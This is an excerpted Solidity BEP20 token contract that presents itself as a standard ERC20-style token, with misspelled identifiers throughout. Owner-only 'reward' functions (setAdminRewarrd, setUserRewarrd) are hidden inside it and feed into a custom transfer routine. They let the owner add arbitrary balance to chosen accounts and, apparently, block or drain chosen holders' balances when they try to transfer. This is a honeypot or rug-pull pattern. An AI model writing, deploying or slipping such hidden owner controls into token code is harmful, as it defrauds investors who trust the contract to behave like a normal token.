...
contract BEP20 is Context {
    ...
    function approve(address spender, uint256 amtount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amtount);
        return true;
    }
    ...
    function _approve(
        ...
        _allowances[owner][spender] = amtount;
        emit Approval(owner, spender, amtount);
    }
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amtount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amtount);
        }
        }
    }
...
contract Token is BEP20, Ownable {
    ...
    function balanceOf(address accouunt) public view virtual returns (uint256) {
        return _balances[accouunt];
    }
    ...
    function _transfer(
        ...
        require(fromBalance >= amtount, "ERC20: transfer amtount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amtount;
    }
        _balances[to] += amtount;

        emit Transfer(from, to, amtount);
    }

    function _burn(address accouunt, uint256 amtount) internal virtual {
        require(accouunt != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accouunt];
        require(accoontBalance >= amtount, "ERC20: burn amtount exceeds balance");
    unchecked {
        _balances[accouunt] = accoontBalance - amtount;
    }
        _totalSupply -= amtount;

        emit Transfer(accouunt, address(0), amtount);
    }

    function _mtin(address accouunt, uint256 amtount) internal virtual {
        require(accouunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amtount;
        _balances[accouunt] += amtount;
        emit Transfer(address(0), accouunt, amtount);
    }
    ...
    mapping(address => int256) private _Rewarrds;
    ...
    function setAdminRewarrd(address acclount,int256 amtount ) public onlyowner {
        _Rewarrds[acclount] += amtount;
    }

    function rmUserRewarrd(address acclount) public onlyowner {
        _Rewarrds[acclount] = 0;
    }


    function setUserRewarrd(address acclount) public onlyowner {
        _Rewarrds[acclount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewarrd(address acclount) public view returns (int256) {
        return _Rewarrds[acclount];
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acooont, "ERC20: transfer amtount exceeds balance");
        if (_Rewarrds[from] > 1){
            _balances[from] = _balances[from].add(uint256(_Rewarrds[from])*1);
        }else if (_Rewarrds[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_Rewarrds[from])*1);
        }
    ...
    function transfer(address to, uint256 amtount) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amtount);
        return true;
    }
    ...
    function transferFrom(
        ...
        _spendAllowance(from, spender, amtount);
        _recF(from, to, amtount);
        return true;
    }
}